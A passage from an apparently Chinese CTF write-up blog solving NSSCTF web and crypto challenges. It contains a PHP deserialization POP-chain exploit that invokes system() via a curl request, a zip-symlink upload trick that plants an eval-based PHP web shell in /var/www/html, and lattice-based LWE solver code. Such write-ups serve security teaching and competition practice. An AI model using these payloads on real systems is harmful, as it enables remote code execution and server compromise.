class="title">bg</span>-<span class="title">gray</span>-50 <span class="title">border</span> <span class="title">border</span>-<span class="title">gray</span>-200 <span class="title">rounded</span>-<span class="title">lg</span>&quot;&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">h3</span> <span class="title">class</span>=&quot;<span class="title">text</span>-<span class="title">lg</span> <span class="title">font</span>-<span class="title">semibold</span> <span class="title">mb</span>-2 <span class="title">text</span>-<span class="title">gray</span>-800&quot;&gt;上传结果:&lt;/<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">output</span>; ?&gt;</span></span><br><span class="line"><span class="class">                &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">p</span> <span class="title">class</span>=&quot;<span class="title">mt</span>-6 <span class="title">text</span>-<span class="title">center</span> <span class="title">text</span>-<span class="title">sm</span> <span class="title">text</span>-<span class="title">gray</span>-500&quot;&gt;</span></span><br><span class="line"><span class="class">                只允许上传 .<span class="title">txt</span>, .<span class="title">png</span>, .<span class="title">gif</span>, .<span class="title">jpg</span> 文件。</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>两个功能：上传和<strong>文件MD5校验</strong><br>漏洞出现在<code>$file_object = @unserialize($filename_param);</code><br><strong>POP链构造</strong>：</p><ul><li>链尾</li></ul><p>类<code>ContentProcessor</code>出现了<code>($_POST[&#39;cmd&#39;])</code>我们不难猜测，前面的<code>$this-&gt;callbackFunction</code>可以构造<code>system</code>函数</p><p><code>$this-&gt;$key</code>就是类<code>FunctionInvoker</code>了，它只有<code>__call</code>方法，前面构造的<code>system</code>函数就能触发</p><ul><li>链首</li></ul><p>那么谁来触发<code>__get</code>呢？<br>我们知道反序列化的入口是<code>FileManager-&gt;getFileHash()</code>，<code>$md5_hash = md5_file($this-&gt;targetFile)</code> <code>else if (is_object($this-&gt;targetFile))</code>正好我们传入对象时，PHP的<code>md5_file</code>会把对象自动转化为字符串，从而触发<code>__toString</code></p><ul><li>中间</li></ul><p>注意到<code>$this-&gt;$method($var)</code>，观察<code>var</code>的位置，<code>performWriteOperation</code>可以作为<code>method</code>，<code>$targetObject = $this-&gt;targetFile; $value = $targetObject-&gt;$var;</code> <code>$var</code>可以指向<code>private $processedContent;</code>来触发链尾的<code>__get</code>。</p><p><code>FileManager::__toString() -&gt; FileManager::performWriteOperation() -&gt; ContentProcessor::__get()</code></p><p>这里出现了两次<code>$this-&gt;targetFile;</code>，第一次是用来触发<code>__toString</code>的，第二次才是触发<code>__get</code>的<br>PS：<code>$this</code>指的是当前，是实时变化的</p><p>确保<code>submit_md5</code>不为空，进入正确的判断分支，<code>file_to_check</code>为我们反序列化的<code>payload</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 需要定义题目中所有的类，以确保序列化正常</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ApplicationContext</span> </span>&#123;&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FunctionInvoker</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ContentProcessor</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$processedContent</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$callbackFunction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;processedContent = <span class="keyword">new</span> <span class="title class_">FunctionInvoker</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$targetFile</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$responseData</span> = <span class="string">&#x27;default_response&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ---- 开始构建POP链 ----</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 链条末端：创建ContentProcessor对象，设置回调函数为system</span></span><br><span class="line"><span class="variable">$cp</span> = <span class="keyword">new</span> <span class="title class_">ContentProcessor</span>();</span><br><span class="line"><span class="variable">$cp</span>-&gt;callbackFunction = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 中间环节：创建内部FileManager对象，其targetFile指向$cp</span></span><br><span class="line"><span class="variable">$fm2</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm2</span>-&gt;targetFile = <span class="variable">$cp</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 链条起点：创建外部FileManager对象，其targetFile指向$fm2</span></span><br><span class="line"><span class="variable">$fm1</span> = <span class="keyword">new</span> <span class="title class_">FileManager</span>();</span><br><span class="line"><span class="variable">$fm1</span>-&gt;targetFile = <span class="variable">$fm2</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 序列化最终的对象</span></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$fm1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL编码后的Payload:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$payload</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">curl -X POST <span class="string">&#x27;http://node8.anna.nssctf.cn:23190/?action=home&#x27;</span> -d <span class="string">&quot;submit_md5=1&amp;method=performWriteOperation&amp;var=processedContent&amp;cmd=cat /flag&amp;file_to_check=O%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A11%3A%22FileManager%22%3A2%3A%7Bs%3A10%3A%22targetFile%22%3BO%3A16%3A%22ContentProcessor%22%3A2%3A%7Bs%3A34%3A%22%00ContentProcessor%00processedContent%22%3BO%3A15%3A%22FunctionInvoker%22%3A0%3A%7B%7Ds%3A16%3A%22callbackFunction%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7Ds%3A12%3A%22responseData%22%3Bs%3A16%3A%22default_response%22%3B%7D&quot;</span></span><br></pre></td></tr></table></figure><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload*"></a>ez_upload*</h2><p>得把<strong>报错信息</strong>搞出来，然后参考<code>ciscn2023 unzip</code>，<strong>打软链接</strong></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -s /var/www/html <span class="built_in">link</span></span><br><span class="line">zip --symlinks 1.zip <span class="built_in">link</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf <span class="built_in">link</span></span><br><span class="line"><span class="built_in">mkdir</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">cd</span> <span class="built_in">link</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;?php @eval(<span class="variable">$_GET</span>[&#x27;shell&#x27;]) ?&gt;&quot;</span> &gt; shell.php</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">zip -r 2.zip <span class="built_in">link</span></span><br></pre></td></tr></table></figure><p>依次上传<code>1.zip 2.zip</code>，访问<code>url/shell.php?shell=system(ls /);</code><br>因为第二个压缩包会覆盖掉上一个的link目录，而link目录软链接指向了<code>/var/www/html</code>，第二次解压就会把<code>shell.php</code>，解压到<code>/var/www/html</code>目录下面</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Guillotine"><a href="#Guillotine" class="headerlink" title="Guillotine"></a>Guillotine</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;NSSCTF&#123;**************************&#125;&#x27;</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line">e = [choice(<span class="built_in">range</span>(-<span class="number">3</span>,<span class="number">4</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">secret = random.randrange(<span class="number">1</span>,<span class="number">2</span>^n)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="built_in">int</span>(<span class="number">1337</span>))</span><br><span class="line">A = [[[random.randrange(p) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">B = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    b = (<span class="built_in">sum</span>(A[time][j][(secret &gt;&gt; j) &amp; <span class="number">1</span>] <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n))+e[time])%p</span><br><span class="line">    B.append(b)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;give you B:&quot;</span>,B)</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The time for defiance is over. Provide the encryption key, and you shall be granted the mercy of a swift end. Refuse, and your death will be prolonged.&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;&gt;&quot;</span>)) == secret</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Do you really think I would let you go? <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>e</code>是随机的小误差<code>[-3,3]</code><br>A是个三维数组</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        *<span class="number">36</span></span><br><span class="line">        [,]</span><br><span class="line">    ],</span><br><span class="line">    *<span class="number">50</span></span><br><span class="line">    [</span><br><span class="line">        [,],</span><br><span class="line">        ...</span><br><span class="line">        [,]</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>这里<strong>随机数种子固定</strong>，因此<code>A</code>是已知的(不知道为什么<code>sage</code>跑不了<code>random</code>，用<code>Python</code>跑完直接套进去即可)</p><p><code>b</code>就是看<code>secret(36位)</code>移位后的奇偶情况决定取最小的数组里面的第零个还是第一个，并求和，最后再加上一个误差e再模p</p><p>到这一步就要朝<strong>LWE</strong>方向思考了，形如<code>B=A·s+e</code>，但目前无法构造这样的等式</p><p>有个小技巧</p><script type="math/tex; mode=display">因为s_{j}=0/1有，A_{i,j,s_{j}}=A_{i,j,0}·(1-s_{j})+A_{i,j,1}·s_{j}</script><script type="math/tex; mode=display">b_{i}\equiv \left(\sum_{j=0}^{n-1}(A_{i,j,0}+s_{j}·(A_{i,j,1}-A_{i,j,0}))+e_{i}\right)\pmod{p}</script><script type="math/tex; mode=display">b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\equiv \left(\sum_{j=0}^{n-1}s_{j}·(A_{i,j,1}-A_{i,j,0})+e_{i}\right)\pmod{p}</script><script type="math/tex; mode=display">令，b'_{i}\equiv b_{i}-\sum_{j=0}^{n-1}(A_{i,j,0})\pmod{p}</script><script type="math/tex; mode=display">令，A'_{i,j}\equiv A_{i,j,1}-A_{i,j,0}\pmod{p}</script><script type="math/tex; mode=display">有，b'_i \equiv \left( \sum_{j=0}^{n-1} A'_{i, j} \cdot s_j + e_i \right) \pmod{p}</script><script type="math/tex; mode=display">可看做，b'_{i}\equiv A'_{i}\cdot s_{j}+e_{i} \pmod{p}</script><script type="math/tex; mode=display">有，A'_{i}\cdot s_{j}-b'_{i}=-e_{i}+K_{i}p</script><p>$构造下面这个 (n+m+1)×(n+m+1) 维的格的基矩阵 L：$</p><script type="math/tex; mode=display">L = \begin{pmatrix} \mathbf{I}_{n \times n} & (\mathbf{A'})_{n \times m}^T & \mathbf{0}_{n \times 1} \\ \mathbf{0}_{m \times n} & p \cdot \mathbf{I}_{m \times m} & \mathbf{0}_{m \times 1} \\ \mathbf{0}_{1 \times n} & -(\mathbf{b'})^T_{1 \times m} & 1 \\ \end{pmatrix}</script><p>$PS：这里为什么取的是转置矩阵呢？因为矩阵乘法的规定是行乘列$</p><p>$取一个组合向量c=(s_{0},…,s_{35},k_{0},…,k_{49},1)，计算目标向量v=c\cdot L$<br>$I_{n}为单位矩阵，则v的前n个分量为(s_{0},…,s_{35})$<br>$最后一个分量为1，可以通过它来判断规约出来目标向量是否是我们想要的向量$<br>$中间m个分量，第i个分量是(s <em> A’^T)_i + (k </em> pI)_i + (1 * -b’^T)_i$<br>$也就是，\sum_{j=0}^{n-1}A’_{i,j}\cdot s_{j}-b’_{i}+k_{i}p=-e_{i}+K_{i}p+k_{i}p$<br>$如果k_{i}=-K_{i}，中间就是-e_{i}了，很小的一个分量，这样就完美地得到短向量v$</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 1: Replicate the problem&#x27;s parameters and matrix &#x27;A&#x27; generation.</span></span><br><span class="line"><span class="comment"># The random seed is fixed, so &#x27;A&#x27; will be the same every time.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">p, n, m = <span class="number">257</span>, <span class="number">36</span>, <span class="number">50</span></span><br><span class="line"><span class="comment"># import random</span></span><br><span class="line"><span class="comment"># random.seed(int(1337))</span></span><br><span class="line"><span class="comment"># A = [[[random.randrange(p) for _ in range(2)] for _ in range(n)] for _ in range(m)]</span></span><br><span class="line">A = []</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 2: Connect to the server and receive the public vector &#x27;B&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node8.anna.nssctf.cn&#x27;</span>, <span class="number">22485</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&#x27;give you B: &#x27;</span>)</span><br><span class="line">B_str = conn.recvline().strip().decode()</span><br><span class="line">B = <span class="built_in">eval</span>(B_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Received B vector of length <span class="subst">&#123;<span class="built_in">len</span>(B)&#125;</span>&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 3: Formulate the LWE problem by calculating A&#x27; and b&#x27;.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">A_prime = Matrix(GF(p), m, n)</span><br><span class="line">b_prime = vector(GF(p), m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    sum_A0 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        A_prime[i, j] = A[i][j][<span class="number">1</span>] - A[i][j][<span class="number">0</span>]</span><br><span class="line">        sum_A0 += A[i][j][<span class="number">0</span>]</span><br><span class="line">    b_prime[i] = B[i] - sum_A0</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LWE system constructed successfully.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 4: Construct the lattice basis matrix for LLL.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">dim = n + m + <span class="number">1</span></span><br><span class="line">L = Matrix(ZZ, dim, dim)</span><br><span class="line">L.set_block(<span class="number">0</span>, <span class="number">0</span>, Matrix.identity(n))</span><br><span class="line">L.set_block(n, n, Matrix.identity(m) * p)</span><br><span class="line">L.set_block(<span class="number">0</span>, n, A_prime.transpose())</span><br><span class="line"><span class="comment"># -- MODIFICATION IS HERE --</span></span><br><span class="line"><span class="comment"># The original set_block failed because b_prime is a vector.</span></span><br><span class="line"><span class="comment"># We replace it with direct row slicing and assignment.</span></span><br><span class="line">L[dim - <span class="number">1</span>, n:n+m] = -b_prime.lift() <span class="comment"># 有限域到整数域的转换</span></span><br><span class="line">L[dim - <span class="number">1</span>, dim - <span class="number">1</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Lattice basis matrix of shape <span class="subst">&#123;L.dimensions()&#125;</span> constructed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 5: Run the LLL algorithm.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Running LLL algorithm... This might take a moment.&quot;</span>)</span><br><span class="line">L_reduced = L.LLL()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] LLL algorithm completed.&quot;</span>)</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 6: Extract the secret bits from the shortest vector.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">solution_vector = L_reduced[<span class="number">0</span>]</span><br><span class="line">secret_bits = []</span><br><span class="line">found = <span class="literal">False</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">abs</span>(solution_vector[n + m]) == <span class="number">1</span>:</span><br><span class="line">    sign = <span class="built_in">int</span>(solution_vector[n + m])</span><br><span class="line">    s_bits_raw = solution_vector[:n] * sign</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">all</span>(bit <span class="keyword">in</span> (<span class="number">0</span>, <span class="number">1</span>) <span class="keyword">for</span> bit <span class="keyword">in</span> s_bits_raw):</span><br><span class="line">        secret_bits = [<span class="built_in">int</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> s_bits_raw]</span><br><span class="line">        found = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Valid secret bits found in the first vector of the reduced basis!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> found:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Could not find a valid solution vector.&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 7: Reconstruct and send the secret.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="keyword">if</span> secret_bits[i] == <span class="number">1</span>:</span><br><span class="line">        secret += (<span class="number">1</span> &lt;&lt; i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Reconstructed secret: <span class="subst">&#123;secret&#125;</span>&quot;</span>)</span><br><span class="line">conn.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(secret).encode())</span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line"><span class="comment"># Step 8: Receive the flag.</span></span><br><span class="line"><span class="comment"># =============================================================================</span></span><br><span class="line">flag = conn.recvall(timeout=<span class="number">2</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[FLAG] <span class="subst">&#123;flag.strip()&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">50</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">conn.close()</span><br></pre></td></tr></table></figure><h2 id="IqqT"><a href="#IqqT" class="headerlink" title="IqqT*"></a>IqqT*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    q = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span> (GCD(p-<span class="number">1</span>,q-<span class="number">1</span>)) == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">Dbits = <span class="number">440</span></span><br><span class="line">N = p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q-<span class="number">1</span>)</span><br><span class="line">d1 = getPrime(Dbits)</span><br><span class="line">d2 = getPrime(Dbits)</span><br><span class="line">e1 = <span class="built_in">pow</span>(d1, -<span class="number">1</span>,phi)</span><br><span class="line">e2 = <span class="built_in">pow</span>(d2, -<span class="number">1</span>,phi)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e1,N)</span><br><span class="line">c = <span class="built_in">pow</span>(c,e2,N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;N&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e1 = <span class="subst">&#123;e1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e2 = <span class="subst">&#123;e2&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 153098639535230461427067981471925418840838598338005180035334795636906122233147195601425250354397215037964687813767036136951747775082105669481477681815877751367786247871862319200300034505895599830252899234816623479894529037827470533297869568936005422622937802442126007732338221711447957108942595934348420152967</span></span><br><span class="line"><span class="comment"># e1 = 26675174225063019792412591801113799130868333007861486357720578798352030914999710926292644671603600643369845213171396954004158372043593223603274138224817810197939227716991483870437629436082594926630937775718564690554680519001757082557490487364436474044434348412437933432480883175650430050712391958500932343901</span></span><br><span class="line"><span class="comment"># e2 = 43950877784211432364704383093702059665468498126670135130662770287054349774316943441695986309047768423965591753129960761705976613430837039441242214744782506036708881166308335886272786409715558332802625980679432726451306523481798238346507261619084743433957076290727858148266709423500224748925763767341340730807</span></span><br><span class="line"><span class="comment"># c = 93877717323267388927595086106164695425439307573037159369718380924127343418544815509333679743420188507149532789861080535086578879105173477672709484480809535461054572173818555600022970592546859742598747214025487041690467952494343056536435494716815059600034890617984024099540213482984895312025775728869974483561</span></span><br></pre></td></tr></table></figure><script type="math/tex; mode=display">c\equiv m^{e1\cdot e2}\pmod N</script><h2 id="HiddenOracle"><a href="#HiddenOracle" class="headerlink" title="HiddenOracle*"></a>HiddenOracle*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> treasure <span class="keyword">import</span> FLAG, p, a, b</span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [a,b])</span><br><span class="line">A = [randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)]</span><br><span class="line">B = <span class="built_in">sorted</span>([randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>)])</span><br><span class="line">oracle = <span class="keyword">lambda</span> x: <span class="built_in">sum</span>([a*<span class="built_in">pow</span>(<span class="built_in">int</span>(x),b,p) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(A,B)])*E.lift_x(<span class="number">0x1337</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+]&quot;</span>, oracle(<span class="built_in">input</span>(<span class="string">&quot;[?] &quot;</span>)).xy())</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;[*]&quot;</span>)) == A[<span class="number">0</span>]: <span class="built_in">print</span>(FLAG)</span><br></pre></td></tr></table></figure><h2 id="LeetSpe4k"><a href="#LeetSpe4k" class="headerlink" title="LeetSpe4k*"></a>LeetSpe4k*</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">le4t = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join(choice(<span class="built_in">next</span>((j <span class="keyword">for</span> j <span class="keyword">in</span> [<span class="string">&#x27;a@4A&#x27;</span>, <span class="string">&#x27;b8B&#x27;</span>, <span class="string">&#x27;cC&#x27;</span>, <span class="string">&#x27;dD&#x27;</span>, <span class="string">&#x27;e3E&#x27;</span>, <span class="string">&#x27;fF&#x27;</span>, <span class="string">&#x27;g9G&#x27;</span>, <span class="string">&#x27;hH&#x27;</span>, <span class="string">&#x27;iI&#x27;</span>, <span class="string">&#x27;jJ&#x27;</span>, <span class="string">&#x27;kK&#x27;</span>, <span class="string">&#x27;l1L&#x27;</span>, <span class="string">&#x27;mM&#x27;</span>, <span class="string">&#x27;nN&#x27;</span>, <span class="string">&#x27;o0O&#x27;</span>, <span class="string">&#x27;pP&#x27;</span>, <span class="string">&#x27;qQ&#x27;</span>, <span class="string">&#x27;rR&#x27;</span>, <span class="string">&#x27;s$5S&#x27;</span>, <span class="string">&#x27;t7T&#x27;</span>, <span class="string">&#x27;uU&#x27;</span>, <span class="string">&#x27;vV&#x27;</span>, <span class="string">&#x27;wW&#x27;</span>, <span class="string">&#x27;xX&#x27;</span>, <span class="string">&#x27;yY&#x27;</span>, <span class="string">&#x27;z2Z&#x27;</span>] <span class="keyword">if</span> i <span class="keyword">in</span> j), i)) <span class="keyword">for</span> i <span class="keyword">in</span> x.decode())</span><br><span class="line">h4sH = <span class="keyword">lambda</span> x: reduce(<span class="keyword">lambda</span> acc, i: ((acc * (<span class="number">2</span>**<span class="number">255</span>+<span class="number">95</span>)) % <span class="number">2</span>**<span class="number">256</span>) + i, x, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(le4t(flag), h4sH(flag))</span><br><span class="line"><span class="comment">#nSsCtf&#123;H@pPy_A7h_4nNiv3R$arY_ns$C7F_@nD_l3t$_d0_7h3_LllE3t$pEAk!&#125; 9114319649335272435156391225321827082199770146054215376559826851511551461403</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://pic1.zhimg.com/80/v2-831f9285e57fba50f2eb1a6dc8c2b4eb_1440w.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;哦豁，这场化身&lt;strong&gt;AI大师&lt;/strong&gt;，周末上大分&lt;/p&gt;
&lt;h1 </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>熵密杯2025-重庆</title>
    <link href="https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/"/>
    <id>https://hvang10.github.io/2025/07/23/%E7%86%B5%E5%AF%86%E6%9D%AF2025-%E9%87%8D%E5%BA%86/</id>
    <published>2025-07-23T01:42:30.000Z</published>
    <updated>2025-07-23T02:34:12.735Z</updated>
    
